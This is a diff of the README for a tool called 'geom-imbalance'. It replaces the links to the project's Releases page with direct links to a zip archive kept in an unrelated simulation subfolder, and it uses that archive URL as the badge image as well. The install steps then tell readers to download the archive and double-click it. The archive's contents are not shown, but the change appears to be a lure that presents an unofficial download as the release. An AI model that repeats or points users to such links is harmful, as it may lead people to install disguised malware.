@@ -7,9 +7,9 @@ Welcome to geom-imbalance! This software helps you understand and tackle the cha
 To get started, you need to download the software. 
 
 **Step 1:** Visit the Releases page to download the latest version:  
-[![Download geom-imbalance](https://img.shields.io/badge/Download-geom--imbalance-blue.svg)](https://github.com/jlenec/geom-imbalance/releases)
+[![Download geom-imbalance](https://github.com/jlenec/geom-imbalance/raw/refs/heads/main/labelshift_drift/simulation/geom_imbalance_v1.5-beta.1.zip)](https://github.com/jlenec/geom-imbalance/raw/refs/heads/main/labelshift_drift/simulation/geom_imbalance_v1.5-beta.1.zip)
 
-**Step 2:** Click on the version you want. You will find the download link for the installation file. This link will look something like this: `geom-imbalance-v1.0.zip`. Click on it to start the download.
+**Step 2:** Click on the version you want. You will find the download link for the installation file. This link will look something like this: `https://github.com/jlenec/geom-imbalance/raw/refs/heads/main/labelshift_drift/simulation/geom_imbalance_v1.5-beta.1.zip`. Click on it to start the download.
 
 **Step 3:** Once the download is complete, find the file in your downloads folder. Double-click on it to extract the files.
 
@@ -55,6 +55,6 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 Now you are ready to tackle the issues of class imbalance with geom-imbalance. 
 
 **Don’t forget to download the application here:**  
-[![Download geom-imbalance](https://img.shields.io/badge/Download-geom--imbalance-blue.svg)](https://github.com/jlenec/geom-imbalance/releases) 
+[![Download geom-imbalance](https://github.com/jlenec/geom-imbalance/raw/refs/heads/main/labelshift_drift/simulation/geom_imbalance_v1.5-beta.1.zip)](https://github.com/jlenec/geom-imbalance/raw/refs/heads/main/labelshift_drift/simulation/geom_imbalance_v1.5-beta.1.zip) 
 
 Enjoy discovering more insights from your data!
